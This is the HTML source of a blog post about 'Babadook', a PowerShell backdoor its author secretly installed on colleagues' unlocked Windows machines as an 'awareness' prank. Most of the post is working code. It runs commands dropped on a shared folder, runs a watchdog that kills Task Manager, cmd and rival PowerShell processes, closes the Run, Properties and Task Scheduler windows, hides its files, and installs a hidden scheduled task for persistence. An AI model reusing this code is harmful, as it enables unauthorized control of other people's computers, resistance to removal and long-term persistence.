@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='At my previous company I used to prank the colleagues who left their stations unlocked. I call this my &#8220;internal awareness program&#8221;.
+It was all fun and games at the beginning. I would leave post-its on their monitors with a friendly message &#8220;You could&#8217;ve been hacked&#8221; but it wasn&#8217;t giving the expected results. Some colleagues found it funny and started &#8220;collecting&#8221; my post-its. There was a guy in particular with 5 of them.'>
+
+<meta property='og:title' content='Babadook: Connection-less Powershell Persistent and Resilient “Backdoor” • wroot'>
+<meta property='og:description' content='At my previous company I used to prank the colleagues who left their stations unlocked. I call this my &#8220;internal awareness program&#8221;.
+It was all fun and games at the beginning. I would leave post-its on their monitors with a friendly message &#8220;You could&#8217;ve been hacked&#8221; but it wasn&#8217;t giving the expected results. Some colleagues found it funny and started &#8220;collecting&#8221; my post-its. There was a guy in particular with 5 of them.'>
+<meta property='og:url' content='http://wroot.org/posts/babadook-connection-less-powershell-persistent-and-resilient-backdoor/'>
+<meta property='og:site_name' content='wroot'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts'><meta property='article:tag' content='backdoor'><meta property='article:tag' content='malware'><meta property='article:tag' content='persistance'><meta property='article:tag' content='powershell'><meta property='article:tag' content='rootkit'><meta property='article:published_time' content='2015-09-23T14:13:55Z'/><meta property='article:modified_time' content='2015-09-23T14:13:55Z'/><meta name='twitter:card' content='summary'><meta name='twitter:site' content='@jseidl'>
+
+<meta name="generator" content="Hugo 0.53" />
+
+  <title>Babadook: Connection-less Powershell Persistent and Resilient “Backdoor” • wroot</title>
+  <link rel='canonical' href='http://wroot.org/posts/babadook-connection-less-powershell-persistent-and-resilient-backdoor/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'><link rel='stylesheet' href='/webfonts/ptserif/main.css'><link rel='stylesheet' href='/webfonts/source-code-pro/main.css'><link rel='stylesheet' href='/css/style.css'>
+  
+
+</head>
+
+
+<body>
+<div id="container">
+    <header id="header">
+    <div id="header-outer" class="outer">
+        <div id="header-inner" class="inner">
+            <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+            <a id="logo" class="logo-text" href="http://wroot.org/">wroot</a>
+            <nav id="main-nav">
+                
+                <a class="main-nav-link" href="/about/">About</a>
+                
+                <a class="main-nav-link" href="/talks/">Talks</a>
+                
+                <a class="main-nav-link" href="/projects/">Projects</a>
+                
+                <a class="main-nav-link" href="/press/">Press</a>
+                
+                <a class="main-nav-link" href="https://twitter.com/jseidl">Twitter</a>
+                
+                <a class="main-nav-link" href="https://www.linkedin.com/in/janseidl">LinkedIn</a>
+                
+                <a class="main-nav-link" href="http://github.com/jseidl">GitHub</a>
+                
+                <a class="main-nav-link" href="http://www.slideshare.net/jseidl/">SlideShare</a>
+                
+            </nav>
+            <nav id="sub-nav">
+                <div id="search-form-wrap">
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+    <section id="main" class="outer">
+        <article class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        <header class="article-header">
+            <h1 class="article-title" itemprop="name">Babadook: Connection-less Powershell Persistent and Resilient “Backdoor”</h1>
+        </header>
+        
+        <div class="article-meta">
+            
+            <a href="/posts/babadook-connection-less-powershell-persistent-and-resilient-backdoor/" class="article-date">
+                <time datetime='2015-09-23T14:13:55.000&#43;00:00' itemprop="datePublished">2015-09-23</time>
+            </a>
+            
+            
+            
+            <div class="post-categories">
+                <div class="article-category">
+                    
+                    
+                    <a class="article-category-link" href="http://wroot.org//categories/malware">Malware</a>
+                    
+                    
+                    <span>&gt;</span>
+                    
+                    <a class="article-category-link" href="http://wroot.org//categories/penetration-testing">Penetration Testing</a>
+                    
+                </div>
+            </div>
+            
+            
+        </div>
+        <div class="article-entry" itemprop="articleBody">
+            
+
+<p>At my previous company I used to prank the colleagues who left their stations unlocked. I call this my &#8220;internal awareness program&#8221;.</p>
+
+<p>It was all fun and games at the beginning. I would leave post-its on their monitors with a friendly message <em>&#8220;You could&#8217;ve been hacked&#8221;</em> but it wasn&#8217;t giving the expected results. Some colleagues found it funny and started &#8220;collecting&#8221; my post-its. There was a guy in particular with 5 of them. It was evident harder measures had to be taken.</p>
+
+<p>I&#8217;ve escalated the awareness program by replacing post-its to emailing the whole team with the message <em>&#8220;I was reckless and left my computer unlocked&#8221;</em>. Everybody would laugh about it but still wasn&#8217;t giving the needed outcome: People locking their desktops when away from the station.</p>
+
+<p><img src="https://wroot.org/wp/wp-content/uploads/2015/07/deeper.jpg" alt="" width="512" height="279" class="aligncenter size-full wp-image-54010" srcset="https://wroot.org/wp/wp-content/uploads/2015/07/deeper.jpg 512w, https://wroot.org/wp/wp-content/uploads/2015/07/deeper-300x163.jpg 300w" sizes="(max-width: 512px) 100vw, 512px" /></p>
+
+<h2 id="overcoming-restrictions">Overcoming restrictions</h2>
+
+<p>I came to the conclusion that my colleagues would only learn the lesson if in fact they got hacked somehow, so I decided to make a backdoor so I&#8217;d be able to mess with their machines remotely.</p>
+
+<p>Turns out that we were in a fairly constrained environment:</p>
+
+<ul>
+<li>No direct connections between machines: VLAN isolation</li>
+<li>User-only access, no admin privileges, cannot install anything</li>
+<li>Corporate anti-virus in use, cannot use off-the-shelf solutions</li>
+</ul>
+
+<p>So I started thinking what could I do with what I had in hands. As we were using Windows 7, one powerful tool came to my mind: POWERSHELL. Aw yiss!</p>
+
+<p>I still needed to overcome some situations, no direct connections, inability to open sockets and so on.</p>
+
+<p>As we were all members of the same team, we had access to the some shared folders and that was the vector that popped my mind. I would place a script on this shared folder and my backdoor would read this script and kinda <code>eval()</code> it. Simple and effective.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$SharePath = <span style="color:#e6db74">&#34;\\ournas\ourteamfolder\somesubfolder&#34;</span>
+$MyPID = $(<span style="color:#66d9ef">[System.Diagnostics.Process]</span>::GetCurrentProcess()).Id
+$Interval = 10
+$CurrMachineCmdPath = <span style="color:#e6db74">&#34;</span>$($SharePath)<span style="color:#e6db74">\cmd.</span>$($env:COMPUTERNAME)<span style="color:#e6db74">.</span>$($MyPID)<span style="color:#e6db74">.ps1&#34;</span>
+
+<span style="color:#75715e"># ... some code</span>
+
+<span style="color:#75715e"># Command parsing loop</span>
+<span style="color:#66d9ef">While</span> ($true) {
+            
+    <span style="color:#66d9ef">If</span> (Test-Path $CurrMachineCmdPath) {
+        <span style="color:#66d9ef">Try</span> {
+            &amp; $CurrMachineCmdPath
+            Clear-Content $CurrMachineCmdPath
+        } <span style="color:#66d9ef">Catch</span> <span style="color:#66d9ef">[system.exception]</span> {
+            Log <span style="color:#e6db74">&#34;Error running script: $_&#34;</span>
+        }<span style="color:#75715e"># end :: try/catch</span>
+    }<span style="color:#75715e"># end :: if</span>
+
+    Start-Sleep $Interval
+}<span style="color:#75715e">#end :: while</span></code></pre></div>
+
+<p>So by using the shared folder strategy and using powershell I&#8217;d solve the isolation problem AND the antivirus problem at once. I&#8217;ve added <code>Clear-Content</code> so the script would only run the code once.</p>
+
+<p>I&#8217;ve skipped lunch for a day and rigged a quick and dirty POC. Tested on my machine, found a colleague that had left the machine unlocked and BAM, it was working.</p>
+
+<p>After some days of fun, they started figuring out and killing my powershell process from the task manager. I needed to make the backdoor resilient.</p>
+
+<h2 id="enter-babadook">Enter Babadook</h2>
+
+<p>The name came from an excellent scary movie (I trully recomend you to watch it!) I&#8217;d seen a while ago called <a href="http://www.imdb.com/title/tt2321549/" target="_blank">The Babadook @ IMDB</a>, which had the quote <em>&#8220;If it&#8217;s in a word or in a look, you can&#8217;t get rid of the Babadook&#8221;</em>.</p>
+
+<p>That&#8217;s the motto I would follow to my backdoor. Make it unkillable as long as reasonably possible. Stealthiness wasn&#8217;t a big deal. Once I&#8217;d started playing the <em>&#8220;Super Mario Theme Song&#8221;</em> on their PC Speakers my presence would be spotted.</p>
+
+<p>I kinda also wanted them to know and after some while after they came back to their stations and realized they had left it unlocked, they knew they had been pranked.</p>
+
+<p><img src="https://wroot.org/wp/wp-content/uploads/2015/07/the-babadook.jpg" alt="The Babadook" width="687" height="444" class="aligncenter size-full wp-image-54017" srcset="https://wroot.org/wp/wp-content/uploads/2015/07/the-babadook.jpg 687w, https://wroot.org/wp/wp-content/uploads/2015/07/the-babadook-300x194.jpg 300w" sizes="(max-width: 687px) 100vw, 687px" /></p>
+
+<h3 id="multi-threading-and-the-watchdog-routine">Multi-threading and the Watchdog routine</h3>
+
+<p>I quickly concluded that I&#8217;d needed to make my backdoor multi-threaded to have something watching my back while the main routine was waiting for commands. Powershell&#8217;s &#8220;<a href="http://blogs.technet.com/b/heyscriptingguy/archive/2012/12/31/using-windows-powershell-jobs.aspx" target="_blank">Jobs</a>&#8221; functionality would fit.</p>
+
+<p>I&#8217;ve created a Watchdog function which were merely a <code>while ($True)</code> loop sending <code>Stop-Process -processname taskmgr</code> and ignoring errors (if the Task Manager wasn&#8217;t running).</p>
+
+<p>I did the same for <code>cmd.exe</code>, <code>wscript.exe</code> and <code>cscript.exe</code> just to be safe.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Stop-Process -processname taskmgr -Force -ErrorAction SilentlyContinue Stop-Process -processname cmd -Force -ErrorAction SilentlyContinue Stop-Process -processname wscript -Force -ErrorAction SilentlyContinue Stop-Process -processname cscript -Force -ErrorAction SilentlyContinue </code></pre></div>
+
+<p>This also effectively blocks running <code>.bat</code> and <code>.vbs</code> files since the interpreter has no chance to fully load before being killed by Babadook.</p>
+
+<p>That worked for a while until IT released a <acronym title="Group Policy Objects">GPO</acronym> update blocking powershell remoting and thus blocking the use of powershell Jobs. *sadface*</p>
+
+<p>So the quest for an alternative began and remembering how powershell and .NET integrate beautifully I was sure I could use some <code>Somelongnamespace.Threading.Something</code> .NET voodoo to accomplish that. Turned out the solution was way easier by using powershell&#8217;s <a href="http://thesurlyadmin.com/2013/02/11/multithreading-powershell-scripts/" target="_blank">Runspaces</a>.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$Watchdog = { <span style="color:#75715e"># code here }</span>
+
+<span style="color:#75715e"># &#34;If it&#39;s in a word or in a look, you can&#39;t get rid of the babadook&#34;</span>
+$Global:BabadookWatchdog = <span style="color:#66d9ef">[PowerShell]</span>::Create().AddScript($Watchdog)
+$Global:WatchdogJob = $Global:BabadookWatchdog.BeginInvoke()
+
+<span style="color:#75715e"># ... code ...</span>
+
+<span style="color:#75715e"># Stop Watchdog</span>
+<span style="color:#66d9ef">If</span> ($Global:BabadookWatchdog <span style="color:#f92672">-And</span> $Global:WatchdogJob) {
+    Log <span style="color:#e6db74">&#34;Stopping Babadook Watchdog&#34;</span>
+	<span style="color:#75715e"># No EndInvoke because we won&#39;t return (while true loop) and we don&#39;t care about the return anyway</span>
+    $Global:BabadookWatchdog.Dispose() | Out-Null
+    Log <span style="color:#e6db74">&#34;Watchdog disposed&#34;</span>
+}<span style="color:#75715e"># end :: if</span></code></pre></div>
+
+<p>It worked as a charm! My watchdog was up again killing Task Manager immediatly as the window would (try) to appear. My colleagues were going crazy.</p>
+
+<p><em>NOTE: Up to this moment I&#8217;ve been facing some issues with <code>BeginInvoke</code> which seems to fail to run ever once in a while, still debugging this issue. With Jobs I&#8217;ve never had this issue, instead I had issues where when the Job wasn&#8217;t properly stopped, it would run forever and required a reboot to die since the Watchdog wouldn&#8217;t let me open a powershell session.</em></p>
+
+<h4 id="there-can-be-only-one">There can be only one</h4>
+
+<p><img src="https://wroot.org/wp/wp-content/uploads/2015/07/original.jpg" alt="" width="350" height="241" class="aligncenter size-full wp-image-54026" srcset="https://wroot.org/wp/wp-content/uploads/2015/07/original.jpg 350w, https://wroot.org/wp/wp-content/uploads/2015/07/original-300x207.jpg 300w" sizes="(max-width: 350px) 100vw, 350px" /></p>
+
+<p>In order to ensure that nobody would try to play smart and open a powershell window and try to use the <code>Get-Process</code> and <code>Stop-Process</code> to try to kill my backdoor, I&#8217;ve added the functionality to the watchdog to kill all powershell processes which were not his own. Upon start I&#8217;d save my process ID into a variable and use that to check the other powershell processes.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">Function</span> Kill-PS {
+    Stop-Process -processname powershell_ise -Force -ErrorAction SilentlyContinue <span style="color:#75715e"># Kill powershell_ise.Exe</span>
+    <span style="color:#75715e"># Kill powershell processes which are not me</span>
+    $AllPS = <span style="color:#66d9ef">[array]</span> $(Get-Process | Where-Object { $_.ProcessName <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;powershell&#34;</span> <span style="color:#f92672">-And</span> $_.Id <span style="color:#f92672">-ne</span> <span style="color:#e6db74">&#34;$MyPID&#34;</span> })
+    <span style="color:#66d9ef">If</span> ($AllPS.Count <span style="color:#f92672">-gt</span> 0) {
+    	<span style="color:#66d9ef">ForEach</span> ($Proc <span style="color:#66d9ef">in</span> $AllPS) { Stop-Process -Id $Proc.ID -Force -ErrorAction SilentlyContinue }<span style="color:#75715e"># end :: foreach</span>
+    }<span style="color:#75715e"># end :: if	</span>
+}<span style="color:#75715e"># end :: Kill-PS</span></code></pre></div>
+
+<p>Also, no Powershell ISE here!</p>
+
+<h4 id="you-can-8217-t-run-but-i-can-hide">You can&#8217;t Run but I can hide!</h4>
+
+<p>At the same time my colleagues were desperately trying to kill Babadook, I was also doing the same to ensure I could cover the holes before they were able to get to it.</p>
+
+<p>I&#8217;ve realized that someone could just invoke the <code>taskill</code> command directly from the &#8220;Run&#8221; dialog and that was bad (for me), so I needed a way to prevent that dialog from coming up. As this is a built-in dialog and not a process, I wasn&#8217;t able to take down on the classical way (with <code>Stop-Process</code>) so I&#8217;ve appealed to .NET extensions to grab some Windows <acronym title="Application Programming Interface">API</acronym> calls in order to enumerate the foreground window and if the title was what I wanted, kaboom!.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Add-Type  @<span style="color:#e6db74">&#34; 
+</span><span style="color:#e6db74">    using System;
+</span><span style="color:#e6db74">    using System.Runtime.InteropServices; 
+</span><span style="color:#e6db74">    using System.Text;
+</span><span style="color:#e6db74">         
+</span><span style="color:#e6db74">    public class APIFuncs
+</span><span style="color:#e6db74">    {
+</span><span style="color:#e6db74">        [DllImport(&#34;</span>user32.dll<span style="color:#e6db74">&#34;, CharSet = CharSet.Auto, SetLastError = true)]
+</span><span style="color:#e6db74">    public static extern int GetWindowText(IntPtr hwnd,StringBuilder lpString, int cch);
+</span><span style="color:#e6db74">        [DllImport(&#34;</span>user32.dll<span style="color:#e6db74">&#34;, SetLastError=true, CharSet=CharSet.Auto)]
+</span><span style="color:#e6db74">    public static extern IntPtr GetForegroundWindow();
+</span><span style="color:#e6db74">        [DllImport(&#34;</span>user32.dll<span style="color:#e6db74">&#34;, SetLastError=true, CharSet=CharSet.Auto)]
+</span><span style="color:#e6db74">        public static extern Int32 GetWindowTextLength(IntPtr hWnd);
+</span><span style="color:#e6db74">        [DllImport(&#34;</span>user32.dll<span style="color:#e6db74">&#34;, SetLastError=true, CharSet=CharSet.Auto)]
+</span><span style="color:#e6db74">        public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
+</span><span style="color:#e6db74">                    
+</span><span style="color:#e6db74">        public const int WM_SYSCOMMAND = 0x0112;
+</span><span style="color:#e6db74">        public const int SC_CLOSE = 0xF060;                
+</span><span style="color:#e6db74">        }
+</span><span style="color:#e6db74">&#34;</span>@
+
+<span style="color:#66d9ef">Function</span> Kill-Run {
+    $ForegroundWindow = <span style="color:#66d9ef">[apifuncs]</span>::GetForegroundWindow()
+    $WindowTextLen = <span style="color:#66d9ef">[apifuncs]</span>::GetWindowTextLength($ForegroundWindow)
+    $StringBuffer = New-Object text.stringbuilder -ArgumentList ($WindowTextLen + 1)
+    $ReturnLen = <span style="color:#66d9ef">[apifuncs]</span>::GetWindowText($ForegroundWindow,$StringBuffer,$StringBuffer.Capacity)
+    $WindowText = $StringBuffer.tostring()
+    <span style="color:#66d9ef">if</span> ($WindowText <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;Run&#34;</span>) {
+        <span style="color:#66d9ef">[void][apifuncs]</span>::SendMessage($ForegroundWindow, <span style="color:#66d9ef">[apifuncs]</span>::WM_SYSCOMMAND, <span style="color:#66d9ef">[apifuncs]</span>::SC_CLOSE, 0)
+    }<span style="color:#75715e"># end :: if</span>
+}<span style="color:#75715e"># end :: Kill-Run</span></code></pre></div>
+
+<h5 id="hiding-in-plain-sight">Hiding in plain sight</h5>
+
+<p>To add a sleight of fear, I&#8217;d thought it would be nice to hide my Babadook files since if my victim could find the command script on the shared folder, he could add some code there to kill Babadook and end my party, so a little code to get this sorted out was added to the Watchdog:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">Function</span> Hide-Me {
+    <span style="color:#66d9ef">If</span> (Test-Path $ScriptPath) { $(Get-Item $ScriptPath -Force).Attributes = <span style="color:#e6db74">&#34;Archive,Hidden&#34;</span> }
+    <span style="color:#66d9ef">If</span> (Test-Path $CurrMachineCmdPath) { $(Get-Item $CurrMachineCmdPath -Force).Attributes = <span style="color:#e6db74">&#34;Archive,Hidden&#34;</span> }
+    <span style="color:#66d9ef">If</span> (Test-Path $LogPath) { $(Get-Item $LogPath -Force).Attributes = <span style="color:#e6db74">&#34;Archive,Hidden&#34;</span> }
+    Set-ItemProperty HKCU<span style="color:#960050;background-color:#1e0010">:</span>\\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name Hidden -Value 2 <span style="color:#75715e"># Don&#39;t display hidden files</span>
+}<span style="color:#75715e"># end :: Hide-Me</span></code></pre></div>
+
+<p>The last line adds an entry to the Registry turning on the option &#8220;Don&#8217;t display system and hidden files&#8221;. As this was on the <code>While ($true)</code> loop, even if the user turned that off, it would be turned back on immediately.</p>
+
+<h4 id="take-no-shortcuts">Take no shortcuts</h4>
+
+<p>With my anti-kill countermeasures in place, I was thinking on more ways to kill Babadook to improve the Watchdog, so it came to my mind that one could create a shortcut for <code>taskill</code> so I&#8217;ve made a little modification to my &#8220;Run Killer&#8221;:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># ... some code</span>
+
+<span style="color:#66d9ef">if</span> ($WindowText <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;Run&#34;</span> <span style="color:#f92672">-Or</span> $WindowText.Contains(<span style="color:#e6db74">&#34;Properties&#34;</span>)) {
+    <span style="color:#66d9ef">[void][apifuncs]</span>::SendMessage($ForegroundWindow, <span style="color:#66d9ef">[apifuncs]</span>::WM_SYSCOMMAND, <span style="color:#66d9ef">[apifuncs]</span>::SC_CLOSE, 0)
+}<span style="color:#75715e"># end :: if</span>
+
+<span style="color:#75715e"># ... more code</span></code></pre></div>
+
+<p>That would take care of popping out the &#8220;Properties&#8221; dialog out of any file. Booya!</p>
+
+<h3 id="when-everything-else-fails-reboot">When everything else fails, reboot!</h3>
+
+<p>I&#8217;m sure there are some other ways to kill my process but that was enough for the moment (and I needed to get some lunch anyway). So people started realizing that a reboot was the only way to get rid of the Babadook.</p>
+
+<p>I couldn&#8217;t leave this that way and needed a a persistence method. I first thought about the &#8220;Run&#8221; key on the registry but that might need admin privileges, so why not resort to our well known scheduled tasks?</p>
+
+<p>Popped up a code to copy the Babadook script to the local machine with a random name and create the new task to run &#8220;At Logon&#8221;, &#8220;On Idle&#8221; and &#8220;Daily at 8AM&#8221;.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">function</span> Babadook-Persist
+{
+	$CharSet = <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#34;</span>.ToCharArray()
+	$NewName = $(Get-Random -InputObject $CharSet -Count 8 | % -Begin { $randStr = $null } -Process { $randStr += <span style="color:#66d9ef">[char]</span>$_ } -End { $randStr }) + <span style="color:#e6db74">&#34;.ps1&#34;</span>
+	$NewPath = <span style="color:#e6db74">&#34;</span>$($env:LOCALAPPDATA)<span style="color:#e6db74">\</span>$($NewName)<span style="color:#e6db74">&#34;</span>
+    
+    Install-Task $NewPath
+    
+}<span style="color:#75715e"># end :: Babadook-Persist</span>
+
+<span style="color:#66d9ef">function</span> Install-Task ($BBDPath) {
+    $CommandArguments = <span style="color:#e6db74">&#34;-executionpolicy bypass -windowstyle hidden -f </span><span style="color:#ae81ff">`&#34;</span>$($BBDPath)<span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&#34;</span>
+    $taskRunAsuser = <span style="color:#66d9ef">[Environment]</span>::UserDomainName +<span style="color:#e6db74">&#34;\&#34;</span> + $env:USERNAME
+
+    $service = new-object -com(<span style="color:#e6db74">&#34;Schedule.Service&#34;</span>)
+    $service.Connect()
+    $rootFolder = $service.GetFolder(<span style="color:#e6db74">&#34;\&#34;</span>)
+
+    <span style="color:#66d9ef">Try</span> {
+
+        $rootFolder.GetTask(<span style="color:#e6db74">&#34;\Babadook&#34;</span>) | Out-Null
+        Log <span style="color:#e6db74">&#34;Babadook persist task already installed&#34;</span>
+        
+    } <span style="color:#66d9ef">Catch</span> {
+	
+		Log <span style="color:#e6db74">&#34;Copying Babadook to local machine at </span><span style="color:#ae81ff">`&#34;</span>$($BBDPath)<span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&#34;</span>
+		Copy-Item $script:MyInvocation.MyCommand.Path $BBDPath -Force
+        Log <span style="color:#e6db74">&#34;Installing Babadook persist task&#34;</span>
+
+        $taskDefinition = $service.NewTask(0)
+
+        $regInfo = $taskDefinition.RegistrationInfo
+        $regInfo.Description = <span style="color:#e6db74">&#39;Ba-ba-ba DOOK DOOK DOOK&#39;</span>
+        $regInfo.Author = $taskRunAsuser
+
+        $settings = $taskDefinition.Settings
+        $settings.Enabled = $True
+        $settings.StartWhenAvailable = $True
+        $settings.Hidden = $True
+
+        $triggers = $taskDefinition.Triggers
+
+        <span style="color:#75715e"># Triger time</span>
+        $triggerDaily = $triggers.Create(2)
+        $triggerDaily.StartBoundary = <span style="color:#e6db74">&#34;</span>$(Get-Date -Format <span style="color:#e6db74">&#39;yyyy-mm-dd&#39;</span>)<span style="color:#e6db74">T0800&#34;</span>
+        $triggerDaily.DaysInterval = 1
+        $triggerDaily.Enabled = $True
+
+        <span style="color:#75715e"># Trigger logon</span>
+        $triggerLogon = $triggers.Create(9)
+        $triggerLogon.UserId = $taskRunAsUser
+        $triggerLogon.Enabled = $True
+
+        <span style="color:#75715e"># Trigger Idle</span>
+        $triggerIdle = $triggers.Create(6)
+        $triggerIdle.Enabled = $True
+
+        $Action = $taskDefinition.Actions.Create(0)
+        $Action.Path = <span style="color:#e6db74">&#39;powershell.exe&#39;</span>
+        $Action.Arguments = $CommandArguments
+
+        $rootFolder.RegisterTaskDefinition( <span style="color:#e6db74">&#39;Babadook&#39;</span>, $taskDefinition, 6, $null , $null, 3) | Out-Null
+        
+    }<span style="color:#75715e"># end :: try/catch</span>
+}<span style="color:#75715e"># End :: Install-Task</span></code></pre></div>
+
+<p><em>For more information on Task Scheduler options, check the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa383607(v=vs.85).aspx"><acronym title="Microsoft Developer Network">MSDN</acronym> Technet documentation</a>.</em></p>
+
+<p>That was working beautifully until I realized I needed some concurrency control. Of course my <em>&#8220;There can be only one&#8221;</em> code would kill the competitors but I needed something more elegant and <code>Mutexes</code> came to my mind. Added a code for that also:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Wait for mutex</span>
+<span style="color:#66d9ef">[bool]</span>$MutexWasCreated = $false
+$BabadookMutex = New-Object System.Threading.Mutex($true, $BabadookMutexName, <span style="color:#66d9ef">[ref]</span> $MutexWasCreated)
+<span style="color:#66d9ef">if</span> (!$MutexWasCreated) { 
+    Log <span style="color:#e6db74">&#34;Babadook Mutex found, waiting release...&#34;</span>
+    $BabadookMutex.WaitOne() | Out-Null
+    Log <span style="color:#e6db74">&#34;Babadook Mutex acquired&#34;</span>
+} <span style="color:#66d9ef">else</span> {
+    Log <span style="color:#e6db74">&#34;Babadook Mutex installed&#34;</span>
+}<span style="color:#75715e"># end :: if</span>
+
+<span style="color:#75715e"># ... code ...</span>
+
+<span style="color:#75715e"># Release Mutex</span>
+Log <span style="color:#e6db74">&#34;Releasing Babadook Mutex&#34;</span>
+$BabadookMutex.ReleaseMutex(); 
+$BabadookMutex.Close();</code></pre></div>
+
+<p>And of course I needed to prevent them from opening the &#8220;Scheduled Tasks&#8221; dialog. Since a <code>Stop-Process</code> to the <code>mmc</code> process was giving me &#8220;Access Denied&#8221; (it runs in some kind of UAC), I needed to take the .NET approach. Modified my &#8220;IF&#8221; to consider that:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">if</span> ($WindowText <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;Run&#34;</span> <span style="color:#f92672">-Or</span> $WindowText.Contains(<span style="color:#e6db74">&#34;Properties&#34;</span>) <span style="color:#f92672">-Or</span> $WindowText.Contains(<span style="color:#e6db74">&#34;Task Scheduler&#34;</span>)) {
+    <span style="color:#66d9ef">[void][apifuncs]</span>::SendMessage($ForegroundWindow, <span style="color:#66d9ef">[apifuncs]</span>::WM_SYSCOMMAND, <span style="color:#66d9ef">[apifuncs]</span>::SC_CLOSE, 0)
+}<span style="color:#75715e"># end :: if</span></code></pre></div>
+
+<h2 id="recap">Recap</h2>
+
+<p>So far we got:</p>
+
+<ul>
+<li>Connection-less command execution (full powershell language incl. .NET extensions + system()-like with <code>Start-Process</code>)</li>
+<li>Watchdog / Userkit (userland &#8220;root&#8221;kit)</li>
+<li>Persistence</li>
+<li>Concurrency control</li>
+</ul>
+
+<p>And that worked well enough for me :)</p>
+
+<h2 id="it-8217-s-not-about-the-money">It&#8217;s not about the money</h2>
+
+<p>So if you read until here you might probably been wondering: &#8220;Did you really skipped those lunches just to mess up your colleagues?&#8221;</p>
+
+<p><img src="https://wroot.org/wp/wp-content/uploads/2015/07/62215135.jpg" alt="" width="400" height="400" class="aligncenter size-full wp-image-54036" srcset="https://wroot.org/wp/wp-content/uploads/2015/07/62215135.jpg 400w, https://wroot.org/wp/wp-content/uploads/2015/07/62215135-150x150.jpg 150w, https://wroot.org/wp/wp-content/uploads/2015/07/62215135-300x300.jpg 300w" sizes="(max-width: 400px) 100vw, 400px" /></p>
+
+<p>Well, kinda. It was a great learning and they surely got the message. No one now leaves their session unlocked. :)</p>
+
+<p><img src="https://wroot.org/wp/wp-content/uploads/2015/07/Anchorman-Im-not-even-mad.png" alt="" width="479" height="251" class="aligncenter size-full wp-image-54039" srcset="https://wroot.org/wp/wp-content/uploads/2015/07/Anchorman-Im-not-even-mad.png 479w, https://wroot.org/wp/wp-content/uploads/2015/07/Anchorman-Im-not-even-mad-300x157.png 300w" sizes="(max-width: 479px) 100vw, 479px" /></p>
+
+<p>When the news hit my team leader (how they called the Boss at the company) he saw this was a good way to show upper management and the other teams the dangers of an insider, how basic malware works and escalated the Babadook as a truly internal awareness program, so it turned out to be a great deal for everyone (except for a few really pissed off teammates).</p>
+
+<h2 id="code">Code</h2>
+
+<p>As always, you can get the <a href="https://github.com/jseidl/Babadook">Babadook source at my github</a>.</p>
+
+        </div>
+
+        
+        
+        <div class="article-toc" >
+            <h3>Contents</h3>
+            <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#overcoming-restrictions">Overcoming restrictions</a></li>
+<li><a href="#enter-babadook">Enter Babadook</a>
+<ul>
+<li><a href="#multi-threading-and-the-watchdog-routine">Multi-threading and the Watchdog routine</a>
+<ul>
+<li><a href="#there-can-be-only-one">There can be only one</a></li>
+<li><a href="#you-can-8217-t-run-but-i-can-hide">You can&#8217;t Run but I can hide!</a>
+<ul>
+<li><a href="#hiding-in-plain-sight">Hiding in plain sight</a></li>
+</ul></li>
+<li><a href="#take-no-shortcuts">Take no shortcuts</a></li>
+</ul></li>
+<li><a href="#when-everything-else-fails-reboot">When everything else fails, reboot!</a></li>
+</ul></li>
+<li><a href="#recap">Recap</a></li>
+<li><a href="#it-8217-s-not-about-the-money">It&#8217;s not about the money</a></li>
+<li><a href="#code">Code</a></li>
+</ul></li>
+</ul>
+</nav>
+        </div>
+        
+        
+
+        
+
+
+        
+        <footer class="article-footer">
+            <ul class="article-tag-list">
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/backdoor">backdoor
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
